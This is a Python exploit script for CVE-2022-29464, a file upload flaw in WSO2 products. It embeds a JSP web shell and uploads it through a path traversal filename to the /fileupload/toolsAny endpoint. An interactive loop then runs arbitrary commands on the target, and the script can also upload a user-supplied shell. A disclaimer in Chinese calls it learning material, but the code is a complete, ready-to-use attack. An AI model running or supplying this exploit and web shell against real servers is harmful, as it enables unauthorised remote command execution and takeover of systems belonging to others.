#!/bin/python3
# coding:utf-8
# Author:lowkey0808
import sys
import requests
import pyfiglet
import re
import argparse

print(pyfiglet.figlet_format('cve-2022-29464'))
print('''
免责声明：
    脚本仅供学习参考，请勿恶意攻击他人网站
    如违法乱纪，造成一切后果由使用者自行承担
    技术无罪，与作者无关

    使用脚本默认同意以上说明！

                        --Author:lowkey0808
''')


def main():
    try:
        xloq = '''<FORM>
            <INPUT name='cmd' type=text>
            <INPUT type=submit value='Run'>
        </FORM>
        <%@ page import="java.io.*" %>
            <%
            String cmd = request.getParameter("cmd");
            String output = "";
            if(cmd != null) {
                String s = null;
                try {
                    Process p = Runtime.getRuntime().exec(cmd,null,null);
                    BufferedReader sI = new BufferedReader(new
        InputStreamReader(p.getInputStream()));
                    while((s = sI.readLine()) != null) { output += s+"</br>"; }
                }  catch(IOException e) {   e.printStackTrace();   }
            }
        %>
                <pre><%=output %></pre>'''
        parser = argparse.ArgumentParser(description="cve-2022-29464", argument_default='', usage='python3 -u url')
        parser.add_argument('-u', metavar='', help='目标url')
        parser.add_argument('-s', help='上传的木马,默认上传内置shell.jsp', default=xloq, metavar='')
        argv = parser.parse_args()
        url = argv.u
        shell = argv.s
        if shell == xloq:
            file = {"/../../../../repository/deployment/server/webapps/authenticationendpoint/shell.jsp": shell}
            u1 = url + "/fileupload/toolsAny"
            r1=requests.post(url=u1, files=file, data='')
            if r1.status_code == 200:
                print('[+]漏洞存在')
                while 1:
                    cmd = input('cmd=')
                    if cmd == "exit":
                        sys.exit()
                    else:
                        shell_url = url + "/authenticationendpoint/shell.jsp" + '?cmd=' + cmd
                        i = re.findall(r'<pre>.*?</pre>', requests.get(shell_url).text)
                        print(i)
            else:
                sys.exit('[-]漏洞不存在')
        else:
            with open(shell, 'r', encoding='utf-8') as f:
                read = f.read()
                file = {"/../../../../repository/deployment/server/webapps/authenticationendpoint/%s" % shell: read}
                u2 = url + '/fileupload/toolsAny'
                r2=requests.post(u2, files=file, verify=False)
                if r2.status_code == 200:
                    print('[+]漏洞存在')
                    print("shell地址：", url + "/authenticationendpoint/" + shell)
                else:
                    print('[-]漏洞不存在')
    except Exception as e:
        sys.exit()


if __name__ == "__main__":
    main()
